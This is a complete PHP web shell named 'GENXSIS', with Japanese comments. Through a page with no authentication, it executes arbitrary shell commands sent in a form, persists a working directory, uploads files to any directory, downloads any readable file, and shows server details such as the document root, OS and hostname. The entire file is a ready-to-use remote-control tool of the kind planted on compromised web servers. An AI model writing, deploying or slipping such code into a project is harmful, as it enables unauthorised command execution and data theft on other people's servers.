<?php

function toUTF8($output) {
    foreach ($output as $i => $line) {
        $output[$i] = iconv('Shift-JIS', 'UTF-8', $line);
    }
    return $output;
}

session_start(); // セッションを開始

// 現在のディレクトリを取得
$currentDir = isset($_SESSION['currentDir']) ? $_SESSION['currentDir'] : getcwd();

// ファイルリストを取得
$files = scandir($currentDir);

// コマンド実行結果
$output = '';
$return_var = null;
$uploadSuccess = '';
$currentDir = getcwd(); // 現在のディレクトリを取得
$message = '';

// フォームが送信された場合の処理
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['command'])) {
        $command = $_POST['command'];
        if($command == "" || $command == null){
            $message = "コマンドが入力されていません。";
        } elseif (strpos($command, 'cd ') === 0) {
            // cdコマンドの処理
            $newDir = substr($command, 3);
            // 絶対パスの処理（オプション）
            if (!chdir($_SESSION['currentDir'] . '/' . $newDir)) {
                $output = array("ディレクトリの変更に失敗しました。");
            }
            $_SESSION['currentDir'] = getcwd(); // 現在のディレクトリを更新
        } else {
            // 他のコマンドを実行
            chdir($_SESSION['currentDir']); // セッションに保存されたディレクトリに移動
            exec($command, $output, $return_var);

            $output = toUTF8($output);
        }
    } elseif (isset($_FILES['uploadedFile'])) {
        // ファイルアップロード処理
        $file = $_FILES['uploadedFile'];

        if ($file['error'] === UPLOAD_ERR_OK) {
            // 現在のディレクトリをアップロード先として使用
            $uploadFilePath = $_SESSION['currentDir'] . '/' . basename($file['name']);

            if (move_uploaded_file($file['tmp_name'], $uploadFilePath)) {
                $message =  'ファイルがアップロードされました: ' . htmlspecialchars(basename($file['name']));
            } else {
                $message = 'ファイルのアップロードに失敗しました。';
            }
        } else {
            $message =  'ファイルのアップロードに失敗しました。エラーコード: ' . $file['error'];
        }
    }elseif (isset($_POST['resetDir'])) {
        // ディレクトリをindex.phpがあるディレクトリにリセット
        $_SESSION['currentDir'] = getcwd();
    }elseif (isset($_POST['downloadFilename'])) {
        $filename = $_POST['downloadFilename'];
        $filePath = $_SESSION['currentDir'] . '/' . $filename;

        if (file_exists($filePath) && is_readable($filePath) && !is_dir($filePath)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($filePath));
            readfile($filePath);
            exit;
        } else {
            $message =  'ファイルが存在しないか、アクセスできません。';
        }
    }
}

// HTMLコンテンツの出力
echo "<!DOCTYPE html>";
echo "<html lang='ja'>";
echo "<head>";
echo "<meta charset='UTF-8'>";
echo "<title>GENXSIS</title>";
echo "<link rel='stylesheet' href='res/css/style.css'>";
echo "<style>pre { width: 85%; height: 300px; overflow: auto; margin: 0 auto; }</style>";
echo "</head>";
echo "<body>";
echo "<h1>GENXSIS</h1>";

print "<table class='status-table'>";
print "<tr><td><b>Remote Host:</b></td><td>".(isset($_SERVER['REMOTE_HOST']) ? $_SERVER['REMOTE_HOST'] : "N/A")." (".(isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : "N/A").")</td></tr>";
print "<tr><td><b>Server Signature:</b></td><td>".(isset($_SERVER['SERVER_SIGNATURE']) ? $_SERVER['SERVER_SIGNATURE'] : "N/A")."</td></tr>";
print "<tr><td><b>Server Address:</b></td><td>".(isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : "N/A")."</td></tr>";
print "<tr><td><b>Server Port:</b></td><td>".(isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : "N/A")."</td></tr>";
print "<tr><td><b>Server Software:</b></td><td>".(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : "N/A")."</td></tr>";
print "<tr><td><b>Server Protocol:</b></td><td>".(isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : "N/A")."</td></tr>";
print "<tr><td><b>Document Root:</b></td><td>".(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : "N/A")."</td></tr>";
print "<tr><td><b>OS Name:</b></td><td>".PHP_OS."</td></tr>";
print "<tr><td><b>PC Name:</b></td><td>".gethostname()."</td></tr>";
print "</table>";

echo "<b>Current Directory</b><br><i>" . $_SESSION['currentDir'] . "</i>";

echo "<form method='post' class='execute'>";
echo "<label><input type='text' name='command' size='50'></label>";
echo "<input type='submit' value='execute'>";
echo "</form>";

echo "<form method='post' class='download'>";
echo "<input type='text' name='downloadFilename' size='50' required>";
echo "<input type='submit' value='download'>";
echo "</form>";

echo "<form method='post' enctype='multipart/form-data' class='upload'>";
echo "<input type='file' name='uploadedFile'>";
echo "<input type='submit' value='upload'>";
echo "</form>";

echo "<form method='post' class='reset'>";
echo "<input type='hidden' name='resetDir' value='1'>";
echo "<input type='submit' value='Reset directory'>";
echo "</form>";

echo "<h2>Execution Result：</h2>";
if ($return_var == 0) {
    echo '<pre>';
    if (is_array($output)) {
        foreach ($output as $line) {
            echo htmlspecialchars($line) . PHP_EOL;
        }
    } else {
        echo htmlspecialchars($output);
    }
    echo '</pre>';
} else {
    echo "<p>コマンドの実行に失敗しました。</p>";
}

if ($uploadSuccess) {
    echo "<p>$uploadSuccess</p>";
}

if($message){
    echo htmlspecialchars($message);
}
echo "</body>";
echo "</html>";

